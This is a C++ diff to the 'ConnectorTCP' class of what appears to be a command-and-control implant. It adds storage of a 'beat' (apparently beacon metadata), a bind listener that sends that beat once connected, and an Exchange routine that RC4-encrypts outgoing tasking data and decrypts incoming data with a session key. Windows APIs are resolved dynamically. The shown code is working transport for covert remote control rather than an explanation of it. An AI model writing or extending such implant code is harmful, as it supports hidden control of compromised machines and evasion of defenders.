@@ -2,6 +2,7 @@
 #include "ApiLoader.h"
 #include "ApiDefines.h"
 #include "ProcLoader.h"
+#include "Crypt.h"
 #include "utils.h"
 
 void* ConnectorTCP::operator new(size_t sz) 
@@ -42,8 +43,17 @@ ConnectorTCP::ConnectorTCP()
 	this->functions->shutdown		 = ApiWin->shutdown;
 }
 
-BOOL ConnectorTCP::SetConfig(ProfileTCP profile, BYTE* beat, ULONG beatSize)
+BOOL ConnectorTCP::SetProfile(void* profilePtr, BYTE* beatData, ULONG beatDataSize)
 {
+	ProfileTCP profile = *(ProfileTCP*)profilePtr;
+
+	if (beatData && beatDataSize) {
+		this->beat = (BYTE*)MemAllocLocal(beatDataSize);
+		if (this->beat) {
+			memcpy(this->beat, beatData, beatDataSize);
+			this->beatSize = beatDataSize;
+		}
+	}
 	this->port = profile.port;
 
 	WSAData WSAData;
@@ -242,7 +252,46 @@ void ConnectorTCP::Listen()
     this->allocaSize = 0x100000;
 }
 
+BOOL ConnectorTCP::WaitForConnection()
+{
+    this->Listen();
+    this->SendData(this->beat, this->beatSize);
+    this->connected = TRUE;
+    return TRUE;
+}
+
+BOOL ConnectorTCP::IsConnected()
+{
+    return this->connected;
+}
+
 void ConnectorTCP::Disconnect()
+{
+    this->DisconnectInternal();
+    this->connected = FALSE;
+}
+
+void ConnectorTCP::Exchange(BYTE* plainData, ULONG plainSize, BYTE* sessionKey)
+{
+    if (plainData && plainSize > 0) {
+        EncryptRC4(plainData, plainSize, sessionKey, 16);
+        this->SendData(plainData, plainSize);
+    }
+    else {
+        this->SendData(NULL, 0);
+    }
+
+    if (this->recvSize < 0) {
+        this->connected = FALSE;
+        return;
+    }
+
+    if (this->recvSize > 0 && this->recvData) {
+        DecryptRC4(this->recvData, this->recvSize, sessionKey, 16);
+    }
+}
+
+void ConnectorTCP::DisconnectInternal()
 {
     if (this->allocaSize && this->recvData) {
         memset(this->recvData, 0, this->allocaSize);
@@ -258,6 +307,11 @@ void ConnectorTCP::Disconnect()
 
 void ConnectorTCP::CloseConnector()
 {
+	if (this->beat && this->beatSize) {
+		MemFreeLocal((LPVOID*)&this->beat, this->beatSize);
+		this->beat = NULL;
+		this->beatSize = 0;
+	}
 	this->functions->shutdown(this->SrvSocket, 2);
 	this->functions->closesocket(this->SrvSocket);
 }
